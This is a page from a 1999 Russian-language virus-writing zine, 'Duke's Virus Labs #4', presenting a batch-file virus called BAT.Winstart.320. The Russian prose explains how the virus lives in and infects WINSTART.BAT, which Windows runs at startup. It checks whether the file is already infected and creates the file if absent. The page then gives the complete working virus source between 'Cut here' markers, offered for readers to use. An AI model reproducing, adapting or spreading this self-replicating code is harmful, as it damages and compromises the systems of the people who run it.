- [Duke's Virus Labs #4] - [Page 13] -

BAT.Winstart.320
(c) by Duke/SMF

Имя вируса    : BAT.Winstart.320
Автор         : Duke/SMF
Язык прогр.   : DOS script :)
Дата создания : 12.01.99

   Решил не отступать от доброй традиции и в этом номере так же порадовать
читателей свежим BAT-вирусом. На этот раз я не гонюсь за маленьким размером,
а привожу вариации на тему поражения файла WINSTART.BAT. Как известно,
этот файл выполняется Windows'ом при загрузке системы (если он, то бишь
WINSTART.BAT, существует). Местоположение его известно заранее :
%windir%\winstart.bat . Так вот, мой вирус живет только в этом файле и
всячески стремится в него попасть. При этом он проверяет жертву на
зараженность, а при отсутствии жертвы - создает ее ;)

===== Cut here =====
:YYY
@ctty nul
if "%windir%==" goto clo
set f=%windir%\winstart.bat
if %0==%f% goto clo
if not exist %f% goto typ
type 1>z1
type 2>z2
type 3>z3
echo :NNN>>%f%
del z? /p<%f%
if exist z? goto zar
goto clo
:BAT.Winstart (c) by Duke/SMF
:zar
del z?
type %0>>%f%
goto clo
:typ
type %0>%f%
:clo
ctty con
===== Cut here =====
